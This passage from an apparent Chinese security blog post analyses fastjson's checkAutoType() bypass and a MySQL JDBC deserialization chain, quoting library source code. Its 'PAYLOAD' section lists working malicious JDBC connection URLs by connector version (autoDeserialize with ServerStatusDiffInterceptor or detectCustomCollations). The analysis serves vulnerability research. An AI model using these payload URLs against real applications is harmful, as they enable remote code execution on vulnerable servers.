&#125;<br><br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span> &amp;&amp; Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, fullHash) &lt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>				<span class="hljs-comment">//从map中获取类</span><br>                clazz = TypeUtils.getClassFromMapping(typeName);<br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = <span class="hljs-built_in">this</span>.deserializers.findClass(typeName);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = (Class)<span class="hljs-built_in">this</span>.typeMapping.get(typeName);<br>                &#125;<br>				<span class="hljs-comment">//若在内部白名单中则加载类</span><br>                <span class="hljs-keyword">if</span> (internalWhite) &#123;<br>                    clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                &#125;<br>				<br>                <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">//判断clazz不为HashMap且不为expectClass继承类，则返回类</span><br>                    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<span class="hljs-comment">//autoTypeSupport为false进入</span><br>                        hash = h3;<br><br>                        <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> className.charAt(mask);<br>                            hash ^= (<span class="hljs-type">long</span>)c;<br>                            hash *= <span class="hljs-number">1099511628211L</span>;<br>                            <span class="hljs-comment">//若在黑名单中报错</span><br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                            &#125;<br>							<span class="hljs-comment">//若在白名单中且为期望类则返回类</span><br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                                <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                                &#125;<br><br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">jsonType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>					<span class="hljs-comment">//判断使用注解JSONType的类</span><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-string">&quot;.class&quot;</span>;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.defaultClassLoader != <span class="hljs-literal">null</span>) &#123;<br>                            is = <span class="hljs-built_in">this</span>.defaultClassLoader.getResourceAsStream(resource);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (is != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">ClassReader</span> <span class="hljs-variable">classReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(is, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-type">TypeCollector</span> <span class="hljs-variable">visitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeCollector</span>(<span class="hljs-string">&quot;&lt;clinit&gt;&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br>                            classReader.accept(visitor);<br>                            jsonType = visitor.hasJsonType();<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception var28) &#123;<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        IOUtils.close(is);<br>                    &#125;<br><br>                    mask = Feature.SupportAutoType.mask;<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">autoTypeSupport</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeSupport || (features &amp; mask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="hljs-number">0</span>;			<br>                    <span class="hljs-comment">//若autoTypeSupport(开启autoType)  jsonType(使用JSONType注解)   expectClassFlag(有期望类且期望类符合条件)   其中有一个为true则进入</span><br>                    <span class="hljs-keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;<br>                        <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<span class="hljs-comment">//cacheClass 此处为false</span><br>                        <span class="hljs-comment">//classLoader不开启缓存加载类</span><br>                        clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, cacheClass);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//clazz 不为空进入</span><br>                        <span class="hljs-keyword">if</span> (jsonType) &#123;<span class="hljs-comment">//若jsonType为true则在map中添加类，后返回类</span><br>                            TypeUtils.addMapping(typeName, clazz);<br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br><br>                        <span class="hljs-comment">//若类为ClassLoader、DataSource、RowSet子类则抛出异常</span><br>                        <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz) || RowSet.class.isAssignableFrom(clazz)) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br><br>                        <span class="hljs-comment">//若期望类不为空且目标类为期望类子类则在map中添加类后返回类</span><br>                        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                                TypeUtils.addMapping(typeName, clazz);<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                        &#125;<br><br>                        <span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo.build(clazz, clazz, <span class="hljs-built_in">this</span>.propertyNamingStrategy);<br>                        <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; autoTypeSupport) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;	<span class="hljs-comment">//autoTypeSupport为false抛出异常</span><br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//autoTypeSupport为true则在map中添加类后返回类</span><br>                            TypeUtils.addMapping(typeName, clazz);<br>                        &#125;<br><br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>当第一次进行checkAutoType()校验，传入expectClass为空，通过查找发现以下位置调用checkAutoType()</p>
<p><img src="/image/image-20220914163303120-16631443851911.png" srcset="/img/loading.gif" lazyload alt="image-20220914163303120"></p>
<p>其中JavaBeanDeserializer#deserialze()和ThrowableDeserializer#deserialze()中调用的checkAutoType()均传入expectClass。JavaBeanDeserializer为默认反序列化器，ThrowableDeserializer为针对异常类的反序列化器</p>
<h6 id="2-JavaBeanDeserializer"><a href="#2-JavaBeanDeserializer" class="headerlink" title="2.JavaBeanDeserializer"></a>2.JavaBeanDeserializer</h6><p>第一次通过checkAutoType()检测后运行至</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializer(clazz);<br></code></pre></td></tr></table></figure>

<p>调用至ParserConfig#getDeserializer()，根据typeName获取对应反序列化器</p>
<p><img src="/image/image-20220915101030775-16632078323731.png" srcset="/img/loading.gif" lazyload alt="image-20220915101030775"></p>
<p>最后调用至return new JavaBeanDeserializer(this, clazz, type);创建JavaBeanDeserializer 对象</p>
<p><img src="/image/image-20220915102116512-16632084784343.png" srcset="/img/loading.gif" lazyload alt="image-20220915102116512"></p>
<p>获取反序列化器后运行相应反序列化器deserialze(this, clazz, fieldName)方法，deserializer为不同的反序列化器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> deserializer.deserialze(<span class="hljs-built_in">this</span>, clazz, fieldName);<br></code></pre></td></tr></table></figure>

<p>当调用JavaBeanDeserializer#deserialze(),type为clazz类全名</p>
<p><img src="/image/image-20220914173452845-16631480945763.png" srcset="/img/loading.gif" lazyload alt="image-20220914173452845"></p>
<p>获取第二个@type值为typeName</p>
<p><img src="/image/image-20220914174838376-16631489201257.png" srcset="/img/loading.gif" lazyload alt="image-20220914174838376"></p>
<p>将JSON串中第一个@type值为expectClass，第二个@type值为typeName进程checkAutoType()校验，若符合上述条件则可通过校验</p>
<p><img src="/image/image-20220914173711736-16631482335105.png" srcset="/img/loading.gif" lazyload alt="image-20220914173711736"></p>
<p>通过校验后再次进行反序列化，进一步执行目标类set方法，从而执行恶意gadget</p>
<p><img src="/image/image-20220915113231225-16632127531165.png" srcset="/img/loading.gif" lazyload alt="image-20220915113231225"></p>
<h6 id="3-ThrowableDeserializer"><a href="#3-ThrowableDeserializer" class="headerlink" title="3.ThrowableDeserializer"></a>3.ThrowableDeserializer</h6><p>与之前调用链相同，到达ThrowableDeserializer#deserialze() 前，对第一个@type指定的类进行了ParserConfig#checkAutoType()校验。若通过校验则进入到ThrowableDeserializer#deserialze()，词法分析器将继续遍历JSON字符串剩余的部分，如果下一个仍为@type，则将第二个@type值作为将校验类名称typeNmae，Throwable.class作为期望类expectClass，一同传入ParserConfig#checkAutoType()进行校验</p>
<p><img src="/image/image-20220915145950238-16632251916707.png" srcset="/img/loading.gif" lazyload alt="image-20220915145950238"></p>
<p>通过校验后将再次进行反序列化，进一步执行目标类set方法，从而执行恶意gadget</p>
<p><img src="/image/image-20220915150716972-16632256384399.png" srcset="/img/loading.gif" lazyload alt="image-20220915150716972"></p>
<p>故若需通过ThrowableDeserializer反序列化目标类，通过两次checkAutoType()校验，则需：</p>
<ol>
<li>第一个@type类为Throwable子类且在TypeUtils#mappings中</li>
<li>第二个@type类为Throwable子类</li>
</ol>
<p>因Throwable不在TypeUtils#mappings中，故可使用Throwable子类java.lang.Exception</p>
<h5 id="PAYLOAD-9"><a href="#PAYLOAD-9" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><h6 id="Gadget-1-命令执行"><a href="#Gadget-1-命令执行" class="headerlink" title="Gadget 1:命令执行"></a>Gadget 1:命令执行</h6><p>依赖：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>x.x.xx<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>MySQL JDBC 反序列化链：</p>
<p>ServerStatusDiffInterceptor链</p>
<ul>
<li>5.1.0-5.1.10：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc  连接后需执行查询</li>
<li>5.1.11-5.x.xx：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li>
<li>6.x：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc  （包名中添加cj）</li>
<li>8.0.20以下：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li>
</ul>
<p>detectCustomCollations链</p>
<ul>
<li>5.1.19-5.1.28：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li>
<li>5.1.29-5.1.40：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li>
<li>5.1.41 以上 不可用</li>
</ul>
<p>利用链简单分析：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">**queryInterceptors:**一个逗号分割的Class列表（实现了com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.interceptors</span>.QueryInterceptor接口的Class），在Query<span class="hljs-string">&quot;之间&quot;</span>进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）<br>**autoDeserialize:**自动检测与反序列化存在BLOB字段中的对象。<br></code></pre></td></tr></table></figure>

<p>detectCustomCollations链：</p>
<p>com.mysql.jdbc.ConnectionImpl#buildCollationMapping()方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildCollationMapping</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>	...<br>        <br>    <br>    <span class="hljs-keyword">if</span> (indexToCharset == <span class="hljs-literal">null</span>) &#123;<br>        indexToCharset = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//判断服务版本大于4.1.0且detectCustomCollations为true则进入</span><br>        <span class="hljs-comment">//5.1.28此处判断条件只有服务版本大于4.1.0</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">this</span>.getDetectCustomCollations()) &#123;<br>            java.sql.<span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">results</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                sortedCollationMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>();<br>                customCharset = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>                customMblen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>                stmt = <span class="hljs-built_in">this</span>.getMetadataSafeStatement();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">//执行&quot;SHOW COLLATION&quot; SQL语句</span><br>                    results = stmt.executeQuery(<span class="hljs-string">&quot;SHOW COLLATION&quot;</span>);<br>                    <span class="hljs-comment">//若服务版本大于5.0.0进入</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br>                        <span class="hljs-comment">//调用com.mysql.jdbc.Util#resultSetToMap()方法</span><br>                        Util.resultSetToMap(sortedCollationMap, results, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">while</span>(results.next()) &#123;<br>                            sortedCollationMap.put(results.getLong(<span class="hljs-number">3</span>), results.getString(<span class="hljs-number">2</span>));<br>                        &#125;<br>                    &#125;<br></code></pre></td></tr></table></figure>

<p>com.mysql.jdbc.Util#resultSetToMap()方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resultSetToMap</span><span class="hljs-params">(Map mappedValues, ResultSet rs, <span class="hljs-type">int</span> key, <span class="hljs-type">int</span> value)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">while</span>(rs.next()) &#123;<br>        <span class="hljs-comment">//调用ResultSetImpl#getObject()方法</span><br>        mappedValues.put(rs.getObject(key), rs.getObject(value));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>ResultSetImpl#getObject()方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-type">int</span> columnIndex)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-built_in">this</span>.checkRowPos();<br>    <span class="hljs-built_in">this</span>.checkColumnBounds(columnIndex);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">columnIndexMinusOne</span> <span class="hljs-operator">=</span> columnIndex - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.thisRow.isNull(columnIndexMinusOne)) &#123;<br>        <span class="hljs-built_in">this</span>.wasNullFlag = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.wasNullFlag = <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.fields[columnIndexMinusOne];<br>        String stringVal;<br>        <span class="hljs-keyword">switch</span> (field.getSQLType()) &#123;<br>            <span class="hljs-keyword">case</span> -<span class="hljs-number">7</span>:<br>                <span class="hljs-keyword">if</span> (field.getMysqlType() == <span class="hljs-number">16</span> &amp;&amp; !field.isSingleBit()) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getObjectDeserializingIfNeeded(columnIndex);<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getBoolean(columnIndex);<br>            <span class="hljs-keyword">case</span> -<span class="hljs-number">6</span>:<br>                <span class="hljs-keyword">if</span> (!field.isUnsigned()) &#123;<br>                    <span class="hljs-keyword">return</span> Integer.valueOf(<span class="hljs-built_in">this</span>.getByte(columnIndex));<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getInt(columnIndex);<br>......<br>            <span class="hljs-keyword">case</span> -<span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">if</span> (field.getMysqlType() == <span class="hljs-number">255</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getBytes(columnIndex);<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getObjectDeserializingIfNeeded(columnIndex);<br>           ......<br></code></pre></td></tr></table></figure>

<p>ResultSetImpl#getObject()方法</p>
<ul>
<li>&lt;8.0.20: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li>
<li>6.x(属性名不同): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li>
<li>5.1.11及以上的5.x版本（包名没有了cj）: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc<br>detectCustomCollations触发：<br>5.1.41及以上: 不可用<br>5.1.29-5.1.40: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc<br>5.1.28-5.1.19： jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc<br>5.1.18以下的5.1.x版本： 不可用<br>5.0.x版本不可用</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">getObjectDeserializingIfNeeded</span><span class="hljs-params">(<span class="hljs-type">int</span> columnIndex)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.fields[columnIndex - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">if</span> (!field.isBinary() &amp;&amp; !field.isBlob()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getBytes(columnIndex);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//field.isBinary() &amp;&amp; field.isBlob()进入</span><br>        <span class="hljs-type">byte</span>[] data = <span class="hljs-built_in">this</span>.getBytes(columnIndex);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.connection.getAutoDeserialize()) &#123;<br>            <span class="hljs-keyword">return</span> data;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> data;<br>            <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">null</span> &amp;&amp; data.length &gt;= <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-comment">//data[0] != -84 || data[1] != -19 则表明data不为java类序列化后字节码</span><br>                <span class="hljs-keyword">if</span> (data[<span class="hljs-number">0</span>] != -<span class="hljs-number">84</span> || data[<span class="hljs-number">1</span>] != -<span class="hljs-number">19</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getString(columnIndex);<br>                &#125;<br>				<span class="hljs-comment">//为java序列号字节码则进行反序列化</span><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytesIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data);<br>                    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytesIn);<br>                    obj = objIn.readObject();<br>                    objIn.close();<br>                    bytesIn.close();<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var7) &#123;<br>                    <span class="hljs-keyword">throw</span> SQLError.createSQLException(Messages.getString(<span class="hljs-string">&quot;ResultSet.Class_not_found___91&quot;</span>) + var7.toString() + Messages.getString(<span 